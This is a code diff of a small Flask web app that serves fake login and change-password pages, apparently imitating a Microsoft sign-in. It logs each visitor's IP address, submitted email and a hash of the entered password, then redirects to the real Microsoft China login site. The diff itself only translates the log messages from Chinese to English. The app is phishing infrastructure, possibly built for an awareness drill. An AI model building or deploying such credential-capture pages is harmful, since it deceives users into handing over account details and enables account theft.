@@ -35,7 +35,7 @@ app.url_map.converters['email'] = MobelConverter
 @app.route("/changepwd/<email:email>")
 def changpwd(email):
     session['email'] = email
-    logging.error("进入changepwd链接:["+request.remote_addr+"]"+email)
+    logging.error("url->changepwd:["+request.remote_addr+"]"+email)
     return render_template("./chpwd.html",new_email=email)
 
 @app.route("/changepwd_email",methods=['post','get'])
@@ -43,20 +43,20 @@ def changpwd_email():
     email = session.get("email")
     old_pwd = request.args.get("OldPasswordTextBox")
     M.update(old_pwd.encode('utf-8'))
-    logging.error("提交密码:["+request.remote_addr+"]"+email+"->"+M.hexdigest())
+    logging.error("GET password:["+request.remote_addr+"]"+email+"->"+M.hexdigest())
 
     return redirect("https://login.partner.microsoftonline.cn/")
 
 @app.route("/login/<email:email>")
 def login(email):
     session['email'] = email
-    logging.error("进入login链接:["+request.remote_addr+"]"+email)
+    logging.error("url->login:["+request.remote_addr+"]"+email)
     return render_template("./login.html")
 
 @app.route("/login_email",methods=['get','post'])
 def login_email():
     email = request.args.get("email")
-    logging.error("提交账号:["+request.remote_addr+"]"+email)
+    logging.error("GET email:["+request.remote_addr+"]"+email)
 
     return redirect("https://login.partner.microsoftonline.cn/")
 
